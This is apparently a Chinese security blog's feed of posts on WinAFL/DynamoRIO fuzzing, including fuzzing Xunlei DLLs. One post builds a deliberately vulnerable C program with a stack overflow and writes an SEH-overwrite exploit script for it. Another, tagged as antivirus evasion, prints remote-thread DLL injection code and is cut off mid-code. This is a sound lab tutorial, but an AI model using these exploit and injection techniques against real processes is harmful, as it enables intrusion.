&quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\testin\ubuntu-18.04.5-desktop-amd64.iso.torrent&quot;</span><br></pre></td></tr></table></figure><ul><li><p><strong>问题1：</strong></p><p>如果你使用的<code>Dynamorio</code>是大于 <strong>8.0.0-1</strong>版本的，很大概率会出现错误类似于下面</p><img src="https://img.joe1sn.top/uploads/big/8be39e57103291b9933c16e1a6e5938e.png" alt="image-20230721111548243" style="zoom: 50%;" /><p>这种情况就是生成覆盖率文件是对的，但是测试的时候当程序进行IAT导入的时候，在<code>dynamorio</code>中的harness崩溃了，所以程序还没有进入<code>entry</code>入口点函数就直接寄了。这个错误很有意思，加载类似<code>ntdll.dll</code>或者自己在windows上写的DLL（哪怕无符号）都可以，当harness中的<code>LoadLibrary</code>载入其他DLL的时候（比如某个软件的<code>ffmpeg.dll</code>）也会报错。<br />这个问题我解决了一天也没有解决，到是在看雪找了一个和我一样的帖子</p><p><a href="https://bbs.kanxue.com/thread-274169.htm">https://bbs.kanxue.com/thread-274169.htm</a></p><p><strong>最后我的解决方法是更换到dynamorio 8.0.0-1版本过后重新编译就行了</strong></p></li><li><p><strong>问题2：</strong></p><p>当你使用<code>target_method</code>的时候，程序找不到该方法，这在你进行测试winafl案例的时候很常见，原因是该方法没有进行导出，在函数前面加上<code>extern &quot;C&quot; __declspec(dllexport)</code>就行了</p><img src="https://img.joe1sn.top/uploads/big/9445f402596260b4ace1ac70c24f489b.png" alt="image-20230721112432715" style="zoom:50%;" /></li></ul><p>首先就是缩减testcase</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python &quot;D:\HackTools\Fuzz\__FuzzWork\winafl\winafl-cmin.py&quot; --working-dir &quot;D:\HackTools\Fuzz\__FuzzWork\winafl\build_Win32\bin\Release&quot; -D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32&quot; -t 9000 -i &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\testin&quot; -o &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\in&quot; -coverage_module AssistantTools.dll -coverage_module P2PBase.dll -target_module fuzz_program.exe -target_method fuzz_method -nargs 1 -- fuzz_program.exe @@ </span><br></pre></td></tr></table></figure><p>然后开始fuzz，开启一个Master吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-M master ^</span><br><span class="line">-i &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\in&quot; ^</span><br><span class="line">-o &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\out&quot; ^</span><br><span class="line">-D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32&quot; ^</span><br><span class="line">-I 100000+ -t 9000 -- ^</span><br><span class="line">-coverage_module AssistantTools.dll ^</span><br><span class="line">-coverage_module P2PBase.dll ^</span><br><span class="line">-target_module fuzz_program.exe ^</span><br><span class="line">-target_method fuzz_method ^</span><br><span class="line">-fuzz_iterations 5000 -nargs 1 -- ^</span><br><span class="line">fuzz_program.exe @@</span><br></pre></td></tr></table></figure><ul><li><p><code>-M</code>: 指定这是一个Master进程</p></li><li><p><code>-i -</code>：当fuzz暂停的时候恢复，在AFL上是<code>-in -</code>，具体用法</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-M master ^</span><br><span class="line">-i -&quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\in&quot; ^</span><br><span class="line">-o &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\thunder_fuzzer\out&quot; ^</span><br><span class="line">....</span><br></pre></td></tr></table></figure></li></ul><p><img src="https://img.joe1sn.top/uploads/big/f8eda3779cf4f5a853f8a2e4370b3dfb.png" alt="img" /></p><p>自己改写的harness确实快，但也不至于一下子就跑出来，这里我用旧版本的迅雷试了下</p><img src="https://img.joe1sn.top/uploads/big/964c55b0c61c8d59db09b4b65d3deabb.png" alt="img" style="zoom:67%;" /><p>也就是一个被修复的÷0报错（EXCEPTION_INT_DIVIDE_BY_ZERO）</p><p>昨天16h高强度修复问题1，暂时更新到这里</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;为什么不叫高级篇，因为高级的我也不会&lt;/p&gt;
&lt;p&gt;主要讲一下更贴近实际的用法吧&lt;/p&gt;
&lt;p&gt;!!!仅大标题1完成，全片未完待续!!!&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/categories/CVE/"/>
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/tags/CVE/"/>
    
    <category term="fuzz" scheme="https://joe1sn.eu.org/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>【漏洞挖掘】win-afl使用指北-初级篇</title>
    <link href="https://joe1sn.eu.org/2023/07/18/win-afl/"/>
    <id>https://joe1sn.eu.org/2023/07/18/win-afl/</id>
    <published>2023-07-18T07:27:44.000Z</published>
    <updated>2023-07-19T14:08:42.244Z</updated>
    
    <content type="html"><![CDATA[<p>在21年的时候曾经小小的使用了一点WinAFL，现在再回过头来做笔记</p><p>这里主要讲述WinAFL+DynamoRIO的Fuzz方法</p><span id="more"></span><h1 id="简介"><a class="markdownIt-Anchor" href="#简介"></a> 简介</h1><p>知道创宇这篇文章讲的已经很好了：<a href="https://paper.seebug.org/323/">https://paper.seebug.org/323/</a></p><p>由于闭源特点，那么需要使用DynamoRIO进行插桩，检测指令块的转移</p><p>WinAFL主要特点就是将AFL中的函数使用WinAPI进行重写，然后调用DynamoRIO的API完成fuzz</p><h1 id="编译"><a class="markdownIt-Anchor" href="#编译"></a> 编译</h1><p>主要是参考了<a href="https://bbs.kanxue.com/thread-261323.htm%E5%92%8C%E5%AE%98%E6%96%B9%E8%BF%87%E7%A8%8B%EF%BC%9Ahttps://dynamorio.org/page_building.html">https://bbs.kanxue.com/thread-261323.htm和官方过程：https://dynamorio.org/page_building.html</a></p><h2 id="dynamorio"><a class="markdownIt-Anchor" href="#dynamorio"></a> DynamoRIO</h2><h3 id="32位"><a class="markdownIt-Anchor" href="#32位"></a> 32位</h3><h4 id="1-编译"><a class="markdownIt-Anchor" href="#1-编译"></a> 1. 编译</h4><p>软件下载一把梭</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/DynamoRIO/dynamorio.git</span><br><span class="line">cd dynamorio</span><br><span class="line">mkdir build_Win32</span><br><span class="line">mkdir build_x64</span><br></pre></td></tr></table></figure><p>这里我使用的是<code>x86 Native Tools Command Prompt</code>命令行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake -G&quot;Visual Studio 16&quot; -A Win32 ..</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/77bda948b6a701db350fb235797056e0.png" alt="image-20230719000330825" /></p><p>如果发现缺少什么的话，使用<code>set Name=Value</code>再编译，最后</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake --build . --config RelWithDebInfo</span><br></pre></td></tr></table></figure><h4 id="2-测试"><a class="markdownIt-Anchor" href="#2-测试"></a> 2. 测试</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_win32\bin32\drrun.exe&quot; -t drcov -- &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\32\HelloWorld.exe&quot; &quot;D:\HackTools\Fuzz\WinAFLFuzz\testcase\32\password.txt&quot;</span><br></pre></td></tr></table></figure><p>这里我换成了老版本 dynamorio-cronbuild-8.0.18684，因为新版本是3.0版本的覆盖率文件，IDA Lighthouse只支持2.0，不过你可以通过<a href="https://gist.github.com/wumb0/de671cc5051353fd32af4aecc811a282%E8%BF%9B%E8%A1%8C%E7%89%88%E6%9C%AC%E7%9A%84%E8%BD%AC%E6%8D%A2%E3%80%82">https://gist.github.com/wumb0/de671cc5051353fd32af4aecc811a282进行版本的转换。</a></p><p><img src="https://img.joe1sn.top/uploads/big/47ade84053329cd3875e97c5d3c19562.png" alt="image-20230719081301132" /></p><h3 id="64位"><a class="markdownIt-Anchor" href="#64位"></a> 64位</h3><h4 id="1-编译-2"><a class="markdownIt-Anchor" href="#1-编译-2"></a> 1. 编译</h4><p>按照官方的步骤</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%comspec% /k &quot;C:\Program Files (x86)\Microsoft Visual Studio\2019\Enterprise\VC\Auxiliary\Build\vcvarsamd64_x86.bat&quot;</span><br></pre></td></tr></table></figure><p>或者启动</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Developer Command Prompt for VS 2019</span><br></pre></td></tr></table></figure><p>然后进行cmake配置</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmake -A x64 ..</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/0e10d36abf96b93682871ec08ace8fa9.png" alt="image-20230719081540005" /></p><p>就可以参考看雪那篇文章修改下报错</p><p>利用cmake-gui修改完过后就可以继续回到cmd进行编译了（也可以用vs2019）</p><p><img src="https://img.joe1sn.top/uploads/big/f3984b961053db86e86b2e2056e66173.png" alt="image-20230719081913889" /></p><h4 id="2-测试-2"><a class="markdownIt-Anchor" href="#2-测试-2"></a> 2. 测试</h4><p><img src="https://img.joe1sn.top/uploads/big/e212aa65d03465a205a2b64ff66ea06d.png" alt="image-20230719082924046" /></p><h2 id="winafl"><a class="markdownIt-Anchor" href="#winafl"></a> WinAFL</h2><p>起手式</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/googleprojectzero/winafl.git</span><br><span class="line">cd winafl</span><br><span class="line">git submodule update --init --recursive</span><br><span class="line">mkdir build_Win32</span><br><span class="line">mkdir build_x64</span><br></pre></td></tr></table></figure><ol><li><p>编译32位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmake -G&quot;Visual Studio 16 2019&quot; .. -A Win32 -DDynamoRIO_DIR=D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\cmake -DINTELPT=1 -DUSE_COLOR=1</span><br><span class="line">cmake --build . --config Release</span><br></pre></td></tr></table></figure><p>如果显示<code>drgui</code>不完整，返回去在生成就行了，看雪上的教程是没有问题的</p></li><li><p>编译64位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmake -G&quot;Visual Studio 16 2019&quot; -A x64 .. -DDynamoRIO_DIR=&quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_x64\cmake&quot; -DINTELPT=1 -DUSE_COLOR=1</span><br><span class="line">cmake --build . --config Release</span><br></pre></td></tr></table></figure></li></ol><h1 id="测试"><a class="markdownIt-Anchor" href="#测试"></a> 测试</h1><h2 id="32位-2"><a class="markdownIt-Anchor" href="#32位-2"></a> 32位</h2><ol><li><p>首先进行插桩</p><figure class="highlight bat"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">:: 接受用户输入</span><br><span class="line"><span class="built_in">set</span> /p target_module=traget excutable : </span><br><span class="line"><span class="built_in">set</span> /p target_offset=traget offset : </span><br><span class="line"><span class="built_in">set</span> /p sample=pins sample: </span><br><span class="line"></span><br><span class="line">:: 输出用户输入的内容</span><br><span class="line"><span class="built_in">echo</span> target_module, <span class="variable">%target_module%</span>!</span><br><span class="line"><span class="built_in">echo</span> target_offset, <span class="variable">%target_offset%</span>!</span><br><span class="line"><span class="built_in">echo</span> sample, <span class="variable">%sample%</span>!</span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">D:\<span class="title">HackTools</span>\<span class="title">Fuzz</span>\<span class="title">__FuzzWork</span>\<span class="title">dynamorio</span>\<span class="title">build_Win32</span>\<span class="title">bin32</span>\<span class="title">drrun.exe</span> ^</span></span><br><span class="line"><span class="function">-<span class="title">c</span> <span class="title">D</span>:\<span class="title">HackTools</span>\<span class="title">Fuzz</span>\<span class="title">__FuzzWork</span>\<span class="title">winafl</span>\<span class="title">build_Win32</span>\<span class="title">bin</span>\<span class="title">Release</span>\<span class="title">winafl.dll</span> -<span class="title">debug</span> ^</span></span><br><span class="line"><span class="function">-<span class="title">target_module</span> %<span class="title">target_module</span>% ^</span></span><br><span class="line"><span class="function">-<span class="title">target_offset</span> %<span class="title">target_offset</span>% ^</span></span><br><span class="line"><span class="function">-<span class="title">fuzz_iterations</span> 10 -<span class="title">nargs</span> 2 -- ^</span></span><br><span class="line"><span class="function">%<span class="title">target_module</span>% %<span class="title">sample</span>%</span></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32\drrun.exe ^</span><br><span class="line">-c D:\HackTools\Fuzz\__FuzzWork\winafl\build_Win32\bin\Release\winafl.dll -debug ^</span><br><span class="line">-target_module test.exe ^</span><br><span class="line">-target_offset 0x1210 ^</span><br><span class="line">-fuzz_iterations 10 -nargs 2 -- ^</span><br><span class="line">test.exe .\in\password.txt</span><br></pre></td></tr></table></figure><p>查看生成的log文件，如果有<code>Everything appears to be running normally.</code>那么就是完成了</p></li><li><p>开始fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-i .\in ^</span><br><span class="line">-o &quot;D:\HackTools\Fuzz\WinAFLFuzz\out&quot; ^</span><br><span class="line">-D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32&quot; ^</span><br><span class="line">-I 100000+ -t 90000+ -- ^</span><br><span class="line">-coverage_module test.exe ^</span><br><span class="line">-target_module test.exe ^</span><br><span class="line">-target_offset 0x1210 ^</span><br><span class="line">-fuzz_iterations 5000 -nargs 1 -- ^</span><br><span class="line">test.exe @@</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/ea80329361bc5efe5305e79b94370480.png" alt="image-20230719131211815" /></p></li></ol><h2 id="64位-2"><a class="markdownIt-Anchor" href="#64位-2"></a> 64位</h2><p>过程也差不多</p><p>先插桩</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">traget excutable : test.exe</span><br><span class="line">traget offset : 0x1200</span><br><span class="line">pins sample: .\in\input.bmp</span><br><span class="line">target_module, test.exe!</span><br><span class="line">target_offset, 0x1200!  </span><br><span class="line">sample, .\in\input.bmp!</span><br></pre></td></tr></table></figure><p>然后fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-i .\in ^</span><br><span class="line">-o .\out ^</span><br><span class="line">-D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_x64\bin64&quot; ^</span><br><span class="line">-I 100000+ -t 90000+ -- ^</span><br><span class="line">-coverage_module test.exe ^</span><br><span class="line">-target_module test.exe ^</span><br><span class="line">-target_offset 0x1210 ^</span><br><span class="line">-fuzz_iterations 5000 -nargs 1 -- ^</span><br><span class="line">test.exe @@</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/916e80cff30a0ee3d94ceca18eb32ad4.png" alt="image-20230719134046975" /></p><h1 id="测试2-simplehunt"><a class="markdownIt-Anchor" href="#测试2-simplehunt"></a> 测试2 - SimpleHunt</h1><p>在之前我的博客写了windows下栈溢出的过程，这里我改写了下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hacked</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Hacked\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">vuln</span><span class="params">(<span class="type">char</span> *FileDir)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> password[<span class="number">6</span>] = <span class="string">&quot;ABCDE&quot;</span>;</span><br><span class="line"><span class="type">char</span> str[<span class="number">6</span>];</span><br><span class="line">FILE *fp;</span><br><span class="line"><span class="keyword">if</span>(!(fp=fopen(FileDir,<span class="string">&quot;r&quot;</span>)))&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Open Failed\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line">fgets(str, <span class="number">0x1000</span>, fp);</span><br><span class="line"></span><br><span class="line">str[<span class="number">5</span>]=<span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="built_in">strcmp</span>(str,password)==<span class="number">0</span>)</span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;OK.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OK.\n&quot;</span>);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="comment">// fprintf(stderr,&quot;NO.\n&quot;);</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;NO.\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span> *argv[])</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">2</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Usage: ./HelloWorld.exe FileName\n&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">vuln(argv[<span class="number">1</span>]);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc HelloWorld.c -o HelloWorld</span><br></pre></td></tr></table></figure><p>没有任何保护，这里以32位举例</p><h2 id="fuzz"><a class="markdownIt-Anchor" href="#fuzz"></a> fuzz</h2><p>由于代码比较简单，不需要先生成覆盖率文件找到关键函数，所以首先还是插桩</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32\drrun.exe ^</span><br><span class="line">-c D:\HackTools\Fuzz\__FuzzWork\winafl\build_Win32\bin\Release\winafl.dll -debug ^</span><br><span class="line">-target_module HelloWorld.exe ^</span><br><span class="line">-target_offset 0x16c4 ^</span><br><span class="line">-fuzz_iterations 10 -nargs 2 -- ^</span><br><span class="line">HelloWorld.exe in\password.txt</span><br></pre></td></tr></table></figure><p>开始fuzz</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz.exe ^</span><br><span class="line">-i &quot;D:\HackTools\Fuzz\WinAFLFuzz\in&quot; ^</span><br><span class="line">-o &quot;D:\HackTools\Fuzz\WinAFLFuzz\out&quot; ^</span><br><span class="line">-D &quot;D:\HackTools\Fuzz\__FuzzWork\dynamorio\build_Win32\bin32&quot; ^</span><br><span class="line">-I 100000+ -t 90000+ -- ^</span><br><span class="line">-coverage_module HelloWorld.exe ^</span><br><span class="line">-target_module HelloWorld.exe ^</span><br><span class="line">-target_offset 0x16c4 ^</span><br><span class="line">-fuzz_iterations 5000 -nargs 2 -- ^</span><br><span class="line">HelloWorld.exe @@</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/ec9214e2a5aada0ddc6e74f956f60bf9.png" alt="image-20230719140624246" /></p><p>瞬间找到一个crash</p><h2 id="poc"><a class="markdownIt-Anchor" href="#poc"></a> PoC</h2><p><img src="https://img.joe1sn.top/uploads/big/80b03780c4fcd5ad58467691a3664471.png" alt="image-20230719140746701" /></p><p>使用x32dbg进行调试</p><p><img src="https://img.joe1sn.top/uploads/big/ce1aa16c4a51fe8d5fe578c891edc509.png" alt="image-20230719141111547" /></p><p>刚好修改了EBP寄存器导出错误，很明显的栈溢出。</p><p>具体的EXP构造方法就是使用SEH加载shellcode，具体的在之前的文章已经写过了</p><p>写出exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">shellcode = <span class="string">b&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">offset = <span class="string">b&quot;A&quot;</span>*(<span class="number">0x12c</span>-<span class="built_in">len</span>(shellcode)-<span class="number">32</span>) <span class="comment">#0x1c</span></span><br><span class="line">NSEH = <span class="string">b&quot;\xeb\x06\x90\x90&quot;</span>      <span class="comment">#asm(&quot;jmp 6;nop;nop&quot;)</span></span><br><span class="line">gadget = <span class="string">b&quot;\x9A\x24\x40\x00&quot;</span>    <span class="comment">#40249A</span></span><br><span class="line">self_gadget = <span class="string">b&quot;\x89\xE0\x05\x24\x06\x00\x00\xFF\xE0&quot;</span></span><br><span class="line">payload = <span class="string">b&quot;\xaa&quot;</span>*<span class="number">32</span>+shellcode+offset+NSEH+gadget+self_gadget</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;password.txt&quot;</span>,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(payload)</span><br></pre></td></tr></table></figure><p><img src="https://img.joe1sn.top/uploads/big/04b0986fd3905d3622d739c4a5e3813d.gif" alt="output" /></p><h1 id="参考"><a class="markdownIt-Anchor" href="#参考"></a> 参考</h1><p><a href="https://paper.seebug.org/323/">https://paper.seebug.org/323/</a></p><p><a href="https://bbs.kanxue.com/thread-261323.htm">https://bbs.kanxue.com/thread-261323.htm</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在21年的时候曾经小小的使用了一点WinAFL，现在再回过头来做笔记&lt;/p&gt;
&lt;p&gt;这里主要讲述WinAFL+DynamoRIO的Fuzz方法&lt;/p&gt;</summary>
    
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/categories/CVE/"/>
    
    
    <category term="CVE" scheme="https://joe1sn.eu.org/tags/CVE/"/>
    
    <category term="fuzz" scheme="https://joe1sn.eu.org/tags/fuzz/"/>
    
  </entry>
  
  <entry>
    <title>【免杀】DLL注入小结</title>
    <link href="https://joe1sn.eu.org/2023/07/17/dll-injector/"/>
    <id>https://joe1sn.eu.org/2023/07/17/dll-injector/</id>
    <published>2023-07-17T11:24:51.000Z</published>
    <updated>2023-07-22T00:55:11.113Z</updated>
    
    <content type="html"><![CDATA[<p>DLL 注入进化史</p><span id="more"></span><h1 id="远程线程调用注入"><a class="markdownIt-Anchor" href="#远程线程调用注入"></a> 远程线程调用注入</h1><p>这个是最简单的</p><p>这里我接受的是程序的进程<code>PID</code>和待注入DLL的路径<code>szPath</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">DLLinjector::DllOnLoad</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">this</span>-&gt;<span class="built_in">Check</span>())&#123;</span><br><span class="line">wcout &lt;&lt; <span class="string">&quot;The Process or DLL file not found\n&quot;</span>;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="comment">//向目标进程写入DLL的路径</span></span><br><span class="line">SIZE_T dwWriteSize = <span class="number">0</span>;</span><br><span class="line">HANDLE hProcess = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, <span class="keyword">this</span>-&gt;dwPid);</span><br><span class="line">LPVOID pAddress = <span class="built_in">VirtualAllocEx</span>(hProcess, <span class="literal">NULL</span>, <span class="number">0x100</span>, MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"><span class="built_in">WriteProcessMemory</span>(hProcess, pAddress, <span class="keyword">this</span>-&gt;szPath, <span class="built_in">wcslen</span>(<span class="keyword">this</span>-&gt;szPath)*<span class="number">2</span>+<span class="number">2</span>, &amp;dwWriteSize);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//从ntdll导出 LoadLibraryA 函数</span></span><br><span class="line">HMODULE Ntdll = <span class="built_in">LoadLibraryA</span>(<span class="string">&quot;ntdll.dll&quot;</span>);</span><br><span class="line">LPVOID LoadLibraryBase = <span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">L&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    </span><br><span class="line">HANDLE hRemoteProcess = <span class="built_in">CreateRemoteThread</span>(hProcess, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)LoadLibraryW,pAddress,<span 